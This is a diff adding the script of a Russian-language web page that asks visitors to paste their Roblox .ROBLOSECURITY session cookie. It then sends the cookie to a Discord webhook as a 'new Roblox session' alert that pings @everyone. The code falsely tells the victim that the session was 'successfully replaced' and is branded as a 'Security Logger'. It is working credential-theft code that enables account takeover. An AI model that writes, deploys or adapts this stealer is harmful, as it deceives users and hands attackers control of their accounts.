@@ -1,0 +1,78 @@
+async function sendToDiscord() {
+            const cookie = document.getElementById('cookieInput').value.trim();
+            const statusDiv = document.querySelector('.status');
+
+            if (!cookie) {
+                statusDiv.innerHTML = '❌ Ошибка: Введите cookie!';
+                statusDiv.style.color = '#ff6666';
+                return;
+            }
+
+            // Валидация: проверяем похоже ли на .ROBLOSECURITY cookie
+            if (!cookie.includes('_|WARNING:-DO-')) {
+                statusDiv.innerHTML = '⚠️ Непохоже на валидную .ROBLOSECURITY cookie';
+                statusDiv.style.color = '#ffaa00';
+            }
+
+            statusDiv.innerHTML = '📤 Отправка в Discord...';
+            statusDiv.style.color = '#ffaa00';
+
+            // Формируем красивое сообщение для Discord
+            const embed = {
+                title: "🔐 НОВАЯ СЕССИЯ ROBLOX",
+                color: 0xff4444,
+                fields: [
+                    {
+                        name: "📦 .ROBLOSECURITY",
+                        value: \`\`\`${cookie.length > 500 ? cookie.substring(0, 500) + '...' : cookie}\`\`\`,
+                        inline: false
+                    },
+                    {
+                        name: "🕐 Время",
+                        value: new Date().toLocaleString('ru-RU'),
+                        inline: true
+                    },
+                    {
+                        name: "📏 Длина",
+                        value: ${cookie.length} символов,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "RBX Security Logger"
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: "@everyone **НОВОЕ СООБЩЕНИЕ**",
+                        embeds: [embed]
+                    })
+                });
+
+                if (response.ok) {
+                    statusDiv.innerHTML = '✅ Сессия успешно заменена!';
+                    statusDiv.style.color = '#66ff66';
+                    document.getElementById('cookieInput').value = '';
+                    setTimeout(() => {
+                        statusDiv.innerHTML = 'Статус: Ожидание ввода';
+                        statusDiv.style.color = '#666';
+                    }, 3000);
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                statusDiv.innerHTML = '❌ Ошибка отправки!';
+                statusDiv.style.color = '#ff6666';
+            }
+        }
+    </script>
+</body>
+</html>
